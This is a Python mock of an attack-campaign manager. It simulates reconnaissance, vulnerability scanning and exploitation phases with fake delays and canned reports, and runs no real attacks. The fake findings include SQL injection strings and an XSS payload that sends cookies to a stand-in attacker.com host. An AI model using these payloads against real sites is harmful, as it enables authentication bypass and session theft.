"""
Mock Attack Manager for Testing
Simulates attack execution without actual penetration testing
"""

from typing import Dict, List, Optional, Any
from datetime import datetime
import asyncio
import uuid
from core.unified_enums import AttackPhase, AttackStrategy, TaskStatus, AgentStatus, SeverityLevel
from core.unified_models import (
    AttackCampaign, ReconnaissanceReport, VulnerabilityReport,
    ExploitationReport, VulnerabilityFinding, ExploitAttempt,
    NetworkService
)


class MockAttackManager:
    """
    Mock Attack Manager for development and testing
    Simulates attack execution with realistic delays and fake data
    """
    
    def __init__(self, db=None, ws_manager=None):
        self.db = db
        self.ws_manager = ws_manager
        self.running_campaigns: Dict[str, bool] = {}
    
    async def execute_campaign(
        self,
        campaign_id: str,
        user_id: str,
        phases: List[AttackPhase],
        strategy: AttackStrategy,
        options: Dict[str, Any]
    ):
        """
        Execute an attack campaign
        Simulates multi-phase attack execution
        """
        self.running_campaigns[campaign_id] = True
        
        try:
            # Get campaign
            if not self.db:
                return
            
            campaign_data = await self.db.get_campaign(campaign_id)
            if not campaign_data:
                return
            
            campaign = AttackCampaign(**campaign_data)
            target = campaign.targets[0] if campaign.targets else None
            
            if not target:
                return
            
            # Execute each phase
            total_phases = len(phases)
            for idx, phase in enumerate(phases):
                if not self.running_campaigns.get(campaign_id):
                    break
                
                # Update progress
                campaign.current_phase = phase
                campaign.progress = (idx / total_phases) * 100
                await self.db.update_campaign(campaign_id, campaign.model_dump())
                
                # Send WebSocket update
                if self.ws_manager:
                    await self.ws_manager.broadcast_system({
                        "type": "campaign_progress",
                        "campaign_id": campaign_id,
                        "phase": phase.value,
                        "progress": campaign.progress
                    })
                
                # Execute phase
                if phase == AttackPhase.RECONNAISSANCE:
                    report = await self._mock_reconnaissance(target.url)
                elif phase == AttackPhase.VULNERABILITY_DISCOVERY:
                    report = await self._mock_vulnerability_scan(target.url)
                elif phase == AttackPhase.EXPLOITATION:
                    report = await self._mock_exploitation(target.url)
                else:
                    await asyncio.sleep(2)
                    continue
                
                # Add report to campaign
                campaign.reports.append(report)
                await self.db.update_campaign(campaign_id, campaign.model_dump())
            
            # Mark as completed
            campaign.status = TaskStatus.COMPLETED
            campaign.progress = 100.0
            campaign.completed_at = datetime.utcnow()
            await self.db.update_campaign(campaign_id, campaign.model_dump())
            
            # Send completion notification
            if self.ws_manager:
                await self.ws_manager.broadcast_system({
                    "type": "campaign_completed",
                    "campaign_id": campaign_id
                })
        
        except Exception as e:
            # Mark as failed
            if self.db:
                campaign_data = await self.db.get_campaign(campaign_id)
                if campaign_data:
                    campaign = AttackCampaign(**campaign_data)
                    campaign.status = TaskStatus.FAILED
                    campaign.completed_at = datetime.utcnow()
                    await self.db.update_campaign(campaign_id, campaign.model_dump())
        
        finally:
            self.running_campaigns[campaign_id] = False
    
    async def _mock_reconnaissance(self, target_url: str) -> ReconnaissanceReport:
        """Mock reconnaissance phase"""
        await asyncio.sleep(3)
        
        report = ReconnaissanceReport(
            agent_name="ReconnaissanceAgent",
            target_url=target_url,
            target_host=target_url.replace("http://", "").replace("https://", "").split("/")[0],
            target_ip="192.168.1.100",
            status=AgentStatus.SUCCESS,
            success=True,
            summary="Reconnaissance completed successfully",
            subdomains=["www.example.com", "api.example.com", "admin.example.com"],
            directories=["/admin", "/api", "/uploads", "/backup"],
            network_services=[
                NetworkService(port=80, protocol="tcp", service="http", version="nginx/1.18.0", state="open"),
                NetworkService(port=443, protocol="tcp", service="https", version="nginx/1.18.0", state="open"),
                NetworkService(port=22, protocol="tcp", service="ssh", version="OpenSSH 8.2", state="open"),
            ],
            crawled_urls=[
                f"{target_url}/",
                f"{target_url}/login",
                f"{target_url}/admin",
                f"{target_url}/api/v1/users"
            ],
            forms=[
                {"action": "/login", "method": "POST", "inputs": ["username", "password"]},
                {"action": "/search", "method": "GET", "inputs": ["q"]}
            ],
            parameters=["id", "user", "page", "search", "filter"],
            start_time=datetime.utcnow().timestamp(),
            end_time=datetime.utcnow().timestamp() + 3,
            execution_time=3.0
        )
        
        return report
    
    async def _mock_vulnerability_scan(self, target_url: str) -> VulnerabilityReport:
        """Mock vulnerability scanning phase"""
        await asyncio.sleep(5)
        
        vulnerabilities = [
            VulnerabilityFinding(
                title="SQL Injection in Login Form",
                description="The login form is vulnerable to SQL injection attacks",
                severity=SeverityLevel.CRITICAL,
                confidence=0.95,
                url=f"{target_url}/login",
                parameter="username",
                evidence=["' OR '1'='1", "admin' --", "' UNION SELECT NULL--"],
                remediation="Use parameterized queries and input validation",
                payload_used="admin' OR '1'='1'--",
                http_status=200
            ),
            VulnerabilityFinding(
                title="Cross-Site Scripting (XSS) in Search",
                description="Reflected XSS vulnerability in search parameter",
                severity=SeverityLevel.HIGH,
                confidence=0.85,
                url=f"{target_url}/search",
                parameter="q",
                evidence=["<script>alert('XSS')</script>"],
                remediation="Implement proper output encoding and CSP headers",
                payload_used="<script>alert('XSS')</script>",
                http_status=200
            ),
            VulnerabilityFinding(
                title="Directory Listing Enabled",
                description="Directory listing is enabled on /uploads",
                severity=SeverityLevel.MEDIUM,
                confidence=0.90,
                url=f"{target_url}/uploads/",
                evidence=["Index of /uploads", "Parent Directory"],
                remediation="Disable directory listing in web server configuration"
            ),
            VulnerabilityFinding(
                title="Weak Password Policy",
                description="Password policy allows weak passwords",
                severity=SeverityLevel.LOW,
                confidence=0.70,
                evidence=["Minimum length: 4 characters", "No complexity requirements"],
                remediation="Implement strong password policy with minimum 12 characters"
            )
        ]
        
        report = VulnerabilityReport(
            agent_name="VulnerabilityScannerAgent",
            target=target_url,
            target_technology="nginx/1.18.0, PHP/7.4",
            scan_type="comprehensive",
            status=AgentStatus.SUCCESS,
            success=True,
            summary=f"Found {len(vulnerabilities)} vulnerabilities",
            vulnerabilities=vulnerabilities,
            total_vulnerabilities=len(vulnerabilities),
            critical_count=1,
            high_count=1,
            medium_count=1,
            low_count=1,
            overall_risk_score=7.5,
            start_time=datetime.utcnow().timestamp(),
            end_time=datetime.utcnow().timestamp() + 5,
            execution_time=5.0
        )
        
        return report
    
    async def _mock_exploitation(self, target_url: str) -> ExploitationReport:
        """Mock exploitation phase"""
        await asyncio.sleep(4)
        
        attempts = [
            ExploitAttempt(
                exploit_name="SQL Injection - Authentication Bypass",
                exploit_type="web",
                payload_type="sql_query",
                target_url=f"{target_url}/login",
                target_parameter="username",
                payload="admin' OR '1'='1'--",
                success=True,
                response_code=302,
                response_time=0.5,
                evidence=["Redirected to /dashboard", "Set-Cookie: session=..."]
            ),
            ExploitAttempt(
                exploit_name="XSS - Cookie Theft",
                exploit_type="web",
                payload_type="xss_payload",
                target_url=f"{target_url}/search",
                target_parameter="q",
                payload="<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
                success=False,
                response_code=200,
                response_time=0.3,
                error_message="XSS payload was filtered by WAF"
            )
        ]
        
        report = ExploitationReport(
            agent_name="ExploitationAgent",
            target=target_url,
            vulnerability_type="sql_injection",
            status=AgentStatus.SUCCESS,
            success=True,
            summary="Successfully exploited SQL injection vulnerability",
            attempts=attempts,
            successful_attempts=[a for a in attempts if a.success],
            shell_obtained=False,
            total_attempts=len(attempts),
            success_rate=0.5,
            start_time=datetime.utcnow().timestamp(),
            end_time=datetime.utcnow().timestamp() + 4,
            execution_time=4.0
        )
        
        return report
    
    async def stop_campaign(self, campaign_id: str):
        """Stop a running campaign"""
        self.running_campaigns[campaign_id] = False
    
    async def start_attack(
        self,
        user_id: str,
        user_key: str,
        target_url: str,
        attack_type: str,
        options: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Legacy attack start method (for backward compatibility)
        """
        attack_id = str(uuid.uuid4())
        
        attack_data = {
            "attack_id": attack_id,
            "user_id": user_id,
            "target_url": target_url,
            "attack_type": attack_type,
            "status": "running",
            "started_at": datetime.utcnow().isoformat(),
            "results": {}
        }
        
        if self.db:
            await self.db.save_attack(attack_data)
        
        return {
            "success": True,
            "attack_id": attack_id,
            "status": "running",
            "message": "Attack started successfully"
        }
    
    async def stop_attack(self, attack_id: str) -> Dict[str, Any]:
        """Stop an attack (legacy)"""
        if self.db:
            attack = await self.db.get_attack(attack_id)
            if attack:
                attack["status"] = "stopped"
                attack["completed_at"] = datetime.utcnow().isoformat()
                await self.db.save_attack(attack)
        
        return {
            "success": True,
            "attack_id": attack_id,
            "status": "stopped"
        }
    
    async def get_attack_status(self, attack_id: str) -> Dict[str, Any]:
        """Get attack status (legacy)"""
        if self.db:
            attack = await self.db.get_attack(attack_id)
            if attack:
                return {
                    "attack_id": attack_id,
                    "status": attack.get("status"),
                    "progress": 50.0,
                    "current_phase": "scanning",
                    "started_at": attack.get("started_at")
                }
        
        return {
            "attack_id": attack_id,
            "status": "not_found"
        }

